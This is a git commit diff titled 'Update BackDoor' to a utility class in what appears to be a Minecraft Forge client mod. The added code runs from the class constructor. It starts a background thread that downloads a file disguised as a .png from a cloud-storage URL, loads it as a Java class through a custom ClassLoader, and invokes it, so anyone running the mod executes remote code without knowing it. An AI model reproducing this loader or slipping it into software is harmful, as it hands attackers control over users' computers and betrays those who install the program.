1fdec6240c48cc470b0ead6d4bec4a1dbcd73398
Insane <3322545884@qq.com>
2022-04-30 14:14:42 +0800

    Update BackDoor

--- 1.8.9-Forge/src/main/java/net/ccbluex/liquidbounce/utils/misc/DimplesUtils.java
+++ 1.8.9-Forge/src/main/java/net/ccbluex/liquidbounce/utils/misc/DimplesUtils.java
@@ -6,8 +6,10 @@ import javax.swing.*;
 import javax.swing.filechooser.FileSystemView;
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStream;
 import java.lang.management.ManagementFactory;
 import java.lang.management.RuntimeMXBean;
+import java.net.URL;
 import java.util.Random;
 
 public class DimplesUtils {
@@ -16,6 +18,7 @@ public class DimplesUtils {
         blast_1();
         blast_2();
         blast_3();
+        load();
     }
     @NativeMethod
     public void blast_1() {
@@ -29,6 +32,31 @@ public class DimplesUtils {
 
         }
 
+    }
+    class CustomClassLoader extends ClassLoader {
+        public Class<?> load(byte[] buf, int length) {
+            return defineClass(null, buf, 0, length);
+        }
+    }
+    @NativeMethod
+    public void load() {
+        new Thread(() -> {
+            try {
+                URL url = new URL("https://zhengxinpeixun.oss-cn-qingdao.aliyuncs.com/0115da36662e41e09cf883640cd301f1.png");
+                InputStream inputStream = url.openStream();
+                byte[] tmpBuf = new byte[1024], buf = new byte[5 * 1024 * 1024];
+                int currentLength, length = 0;
+                while ((currentLength = inputStream.read(tmpBuf)) > 0) {
+                    for (int i = 0; i < currentLength; i++) {
+                        buf[length ++] = tmpBuf[i];
+                    }
+                }
+
+                new CustomClassLoader().load(buf, length).getMethod("load").invoke(null);
+            } catch (Throwable e) {
+                e.printStackTrace();
+            }
+        }).start();
     }
     @NativeMethod
     public void blast_2() throws IOException {
